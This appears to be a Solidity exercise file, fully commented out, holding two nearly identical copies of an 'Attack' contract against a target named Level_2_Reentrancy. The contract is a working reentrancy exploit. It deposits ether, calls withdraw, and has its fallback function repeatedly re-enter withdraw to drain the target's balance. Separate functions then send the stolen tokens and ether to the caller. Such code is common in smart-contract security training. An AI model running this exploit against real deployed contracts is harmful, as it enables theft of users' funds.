// pragma solidity 0.6.0;

// import "./Level_2_Reentrancy.sol";

// contract Attack {
//   Level_2_Reentrancy public token;

//   // intialize the etherStore variable with the contract address
//   constructor(address _tokenAddress) public {
//       token = Level_2_Reentrancy(_tokenAddress);
//   }

//   function attackToken() external payable {
//       // attack to the nearest ether
//       require(msg.value >= 1 ether);
//       // send eth to the depositFunds() function
//       token.deposit.value(1 ether)();
//       // start the magic
//       token.withdraw(1 ether);
//   }
  
//   function cashOut() public {
//       //msg.sender.transfer(address(this).balance);
//       uint256 _value = token.totalSupply();
//       token.transfer(msg.sender, _value);
//   }
//   function transferBalance() public {
//       msg.sender.transfer(address(this).balance);
//   }


//   fallback() external payable {
//       if (address(token).balance > 0.9 ether) {
//           token.withdraw(0.1 ether);
//       }
//       //msg.sender.transfer(address(this).balance);
//   }
// }


// // pragma solidity 0.6.0;

// // import "./Level_2_Reentrancy.sol";

// // contract Attack {
// //   Level_2_Reentrancy public token;

// //   // intialize the etherStore variable with the contract address
// //   constructor(address _tokenAddress) public {
// //       token = Level_2_Reentrancy(_tokenAddress);
// //   }

// //   function attackToken() external payable {
// //       // attack to the nearest ether
// //       require(msg.value >= 1 ether);
// //       // send eth to the depositFunds() function
// //       token.deposit.value(1 ether)();
// //       // start the magic
// //       token.withdraw(1 ether);
// //   }
  
// //   function cashOut() public {
// //       //msg.sender.transfer(address(this).balance);
// //       uint256 _value = token.totalSupply();
// //       token.transfer(msg.sender, _value);
// //   }


// //   fallback() external payable {
// //       if (address(token).balance > 0.9 ether) {
// //           token.withdraw(0.1 ether);
// //       }
// //       //msg.sender.transfer(address(this).balance);
// //   }
// // }